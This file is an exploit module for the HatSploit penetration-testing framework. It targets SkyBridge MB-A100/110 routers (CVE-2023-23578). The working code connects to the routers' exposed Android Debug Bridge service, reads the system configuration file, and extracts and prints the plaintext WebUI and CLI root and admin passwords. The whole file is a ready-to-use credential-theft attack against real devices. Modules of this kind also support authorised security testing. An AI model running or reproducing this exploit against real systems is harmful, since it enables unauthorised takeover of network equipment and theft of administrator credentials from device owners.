"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import ADB


class HatSploitModule(Module, ADB):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "SkyBridge MB-A100/110 Credentials Disclosure",
            'Module': "exploit/linux/skybridge/100_110_credentials_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': """
                SkyBridge MB-A100/110 firmware <= 4.2.0 has an Android Debug Bridge
                service exposed allowing attacker to pull configuration file that has
                WebUI and CLI password stored in plain text.
            """,
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "SkyBridge MB-A100 - firmware <= 4.2.0",
                "SkyBridge MB-A110 - firmware <= 4.2.0",
            ],
            'References': [
                {'URL': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23578'},
                {'URL': 'https://www.seiko-sol.co.jp/products/skybridge/skybridge_download/mb-a100/'},
                {'CVE': '2023-23578'}
            ],
            'DisclosureDate': "2023-01-01",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.port.visible = False
        self.host.description = "SkyBridge host."

    def run(self):
        client = self.open_adb()
        client.connect()

        try:
            config = client.send_command('cat /config/current/system.conf')
            config = config.split('\r\n')

            creds = []
            for conf in config:
                conf = conf.split('=')

                if len(conf) == 2:
                    if conf[0] == 'WEBUI_ROOT_PASSWORD':
                        creds.append(('webui', 'root', conf[1]))

                    elif conf[0] == 'WEBUI_ADMIN_PASSWORD':
                        creds.append(('webui', 'admin', conf[1]))

                    elif conf[0] == 'CLI_ROOT_PASSWORD':
                        creds.append(('cli', 'root', conf[1]))

                    elif conf[0] == 'CLI_ADMIN_PASSWORD':
                        creds.append(('cli', 'admin', conf[1]))

            if creds:
                self.print_table("Credentials", ('Login', 'Username', 'Password'), *creds)
            else:
                self.print_warning("Target vulnerable, but no credentials found.")

        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")
